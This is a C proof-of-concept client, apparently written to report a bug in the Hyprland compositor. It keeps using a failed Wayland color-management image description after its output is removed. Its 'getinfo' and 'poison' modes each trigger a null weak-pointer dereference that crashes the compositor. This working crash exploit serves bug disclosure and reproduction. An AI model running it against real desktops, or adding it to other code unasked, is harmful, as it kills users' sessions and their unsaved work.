#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <wayland-client.h>
#include "color-management-v1-client-protocol.h"
#include "xdg-shell-client-protocol.h"

/*
 * Client for bug: a failed (not-ready) wp_image_description_v1 stays usable.
 * After its output is removed, get_image_description sends failed(no_output),
 * yet the object keeps an empty m_settings weak pointer and is still accepted:
 *   getinfo — get_information on it derefs the empty WP
 *             (ColorManagement.cpp:767, main-thread SIGSEGV)
 *   poison  — set_image_description copies the empty WP onto a surface; the
 *             render loop derefs it in isHDR() (Renderer.cpp:2571 →
 *             ColorManagement.cpp:378, render-thread SIGSEGV)
 *
 * Setup: hyprctl output create headless VICTIM   (a throwaway output)
 * Run  : ./repro getinfo VICTIM  |  ./repro poison VICTIM
 *        at the Enter prompt, in another terminal: hyprctl output destroy VICTIM
 *
 * Baseline: Hyprland cm/tonemap-ref-scaling @ 30e438818, render:cm_enabled=1.
 */

static struct wl_display *dpy;
static struct wl_compositor *compo;
static struct wp_color_manager_v1 *cmgr;
static struct xdg_wm_base *wmbase;
static struct wl_shm *shm;
static struct wl_output *victim;
static const char *want_output;
static int got_failed, got_ready;

static void out_noop(void *d, struct wl_output *o, int32_t a, int32_t b, int32_t c, int32_t e,
                     int32_t f, const char *g, const char *h, int32_t i) {
    (void)d; (void)o; (void)a; (void)b; (void)c; (void)e; (void)f; (void)g; (void)h; (void)i;
}
static void out_mode(void *d, struct wl_output *o, uint32_t f, int32_t w, int32_t h, int32_t r) {
    (void)d; (void)o; (void)f; (void)w; (void)h; (void)r;
}
static void out_simple(void *d, struct wl_output *o) { (void)d; (void)o; }
static void out_scale(void *d, struct wl_output *o, int32_t f) { (void)d; (void)o; (void)f; }
static void out_name(void *d, struct wl_output *o, const char *n) {
    (void)d;
    if (want_output && !strcmp(n, want_output))
        victim = o;
}
static void out_desc(void *d, struct wl_output *o, const char *s) { (void)d; (void)o; (void)s; }
static const struct wl_output_listener out_li = {
    .geometry = out_noop, .mode = out_mode, .done = out_simple,
    .scale = out_scale, .name = out_name, .description = out_desc,
};

static void d_failed(void *d, struct wp_image_description_v1 *o, uint32_t cause, const char *msg) {
    (void)d; (void)o;
    got_failed = 1;
    printf("[*] failed(cause=%u, \"%s\") — per spec this object may only be destroyed\n", cause, msg);
    fflush(stdout);
}
static void d_ready(void *d, struct wp_image_description_v1 *o, uint32_t id) {
    (void)d; (void)o;
    got_ready = 1;
    printf("[?] ready(id=%u) — output still alive? destroy it first via hyprctl output destroy\n", id);
    fflush(stdout);
}
static void d_ready2(void *d, struct wp_image_description_v1 *o, uint32_t hi, uint32_t lo) {
    (void)d; (void)o;
    got_ready = 1;
    printf("[?] ready2(id=%u:%u)\n", hi, lo);
    fflush(stdout);
}
static const struct wp_image_description_v1_listener d_li = {
    .failed = d_failed, .ready = d_ready, .ready2 = d_ready2,
};

static void xcfg(void *d, struct xdg_surface *s, uint32_t serial) { (void)d; xdg_surface_ack_configure(s, serial); }
static void xtl_conf(void *d, struct xdg_toplevel *t, int32_t w, int32_t h, struct wl_array *st) {
    (void)d; (void)t; (void)w; (void)h; (void)st;
}
static void xtl_close(void *d, struct xdg_toplevel *t) { (void)d; (void)t; }
static const struct xdg_surface_listener xs_li = { .configure = xcfg };
static const struct xdg_toplevel_listener xt_li = { .configure = xtl_conf, .close = xtl_close };
static void wb_ping(void *d, struct xdg_wm_base *b, uint32_t s) { (void)d; xdg_wm_base_pong(b, s); }
static const struct xdg_wm_base_listener wb_li = { .ping = wb_ping };

static void reg_global(void *d, struct wl_registry *r, uint32_t n, const char *iface, uint32_t ver) {
    (void)d;
    if (!strcmp(iface, "wl_compositor"))
        compo = wl_registry_bind(r, n, &wl_compositor_interface, 4);
    else if (!strcmp(iface, "wp_color_manager_v1"))
        cmgr = wl_registry_bind(r, n, &wp_color_manager_v1_interface, ver < 1 ? 1 : ver);
    else if (!strcmp(iface, "xdg_wm_base")) {
        wmbase = wl_registry_bind(r, n, &xdg_wm_base_interface, 1);
        xdg_wm_base_add_listener(wmbase, &wb_li, NULL);
    } else if (!strcmp(iface, "wl_shm"))
        shm = wl_registry_bind(r, n, &wl_shm_interface, 1);
    else if (!strcmp(iface, "wl_output")) {
        struct wl_output *o = wl_registry_bind(r, n, &wl_output_interface, 4);
        wl_output_add_listener(o, &out_li, NULL);
    }
}
static const struct wl_registry_listener reg_li = { .global = reg_global };

static struct wl_buffer *make_buffer(void) {
    int fd = (int)syscall(SYS_memfd_create, "buf", MFD_CLOEXEC);
    size_t sz = 16 * 16 * 4;
    if (fd < 0 || ftruncate(fd, (off_t)sz) || mmap(0, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) == MAP_FAILED) {
        perror("shm");
        exit(2);
    }
    struct wl_shm_pool *p = wl_shm_create_pool(shm, fd, (int32_t)sz);
    struct wl_buffer *b = wl_shm_pool_create_buffer(p, 0, 16, 16, 16 * 4, WL_SHM_FORMAT_ARGB8888);
    wl_shm_pool_destroy(p);
    close(fd);
    return b;
}

static void press_enter(const char *hint) {
    printf("[*] %s\n[*] press Enter when done…\n", hint);
    fflush(stdout);
    getchar();
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "";
    if (argc > 2)
        want_output = argv[2];

    if (strcmp(mode, "getinfo") && strcmp(mode, "poison")) {
        fprintf(stderr, "usage: %s getinfo VICTIM | poison VICTIM\n", argv[0]);
        return 1;
    }
    if (!want_output) { fprintf(stderr, "missing VICTIM output name (hyprctl monitors)\n"); return 1; }

    if (!(dpy = wl_display_connect(NULL))) { fprintf(stderr, "cannot connect to Wayland display\n"); return 2; }
    struct wl_registry *r = wl_display_get_registry(dpy);
    wl_registry_add_listener(r, &reg_li, NULL);
    wl_display_roundtrip(dpy);
    wl_display_roundtrip(dpy);
    if (!cmgr) { fprintf(stderr, "wp_color_manager_v1 not advertised (render:cm_enabled?)\n"); return 2; }
    if (!victim) { fprintf(stderr, "output '%s' not found (check names via hyprctl monitors)\n", want_output); return 2; }

    struct wp_color_management_output_v1 *cmout = wp_color_manager_v1_get_output(cmgr, victim);
    wl_display_roundtrip(dpy);
    press_enter("in another terminal run:\n    hyprctl output destroy VICTIM");

    struct wp_image_description_v1 *desc = wp_color_management_output_v1_get_image_description(cmout);
    wp_image_description_v1_add_listener(desc, &d_li, NULL);
    while (!got_failed && !got_ready && wl_display_dispatch(dpy) != -1)
        ;
    if (got_ready) { fprintf(stderr, "no failed event received, aborting (was the output actually destroyed?)\n"); return 2; }

    if (!strcmp(mode, "getinfo")) {
        printf("[*] sending get_information on the failed object (null WP deref at ColorManagement.cpp:767)…\n");
        fflush(stdout);
        struct wp_image_description_info_v1 *info = wp_image_description_v1_get_information(desc);
        static const struct wp_image_description_info_v1_listener nulli;
        wp_image_description_info_v1_add_listener(info, &nulli, NULL);
    } else {
        struct wl_surface *s = wl_compositor_create_surface(compo);
        struct xdg_surface *xs = xdg_wm_base_get_xdg_surface(wmbase, s);
        xdg_surface_add_listener(xs, &xs_li, NULL);
        struct xdg_toplevel *tl = xdg_surface_get_toplevel(xs);
        xdg_toplevel_add_listener(tl, &xt_li, NULL);
        xdg_toplevel_set_title(tl, "poison");
        wl_surface_commit(s);
        wl_display_roundtrip(dpy);

        struct wp_color_management_surface_v1 *cms = wp_color_manager_v1_get_surface(cmgr, s);
        wp_color_management_surface_v1_set_image_description(cms, desc,
            WP_COLOR_MANAGER_V1_RENDER_INTENT_PERCEPTUAL); /* copies the empty WP in */
        xdg_toplevel_set_fullscreen(tl, NULL);
        wl_surface_attach(s, make_buffer(), 0, 0);
        wl_surface_damage(s, 0, 0, 16, 16);
        wl_surface_commit(s);
        printf("[*] fullscreen window committed with the failed description; waiting for the render-thread crash (Renderer.cpp:2571 -> isHDR)…\n");
        fflush(stdout);
    }
    while (wl_display_dispatch(dpy) != -1)
        ;
    printf("[!] connection dropped — verify hyprland died (CColorManagementImageDescriptionInfo / isHDR in the stack)\n");
    return 0;
}
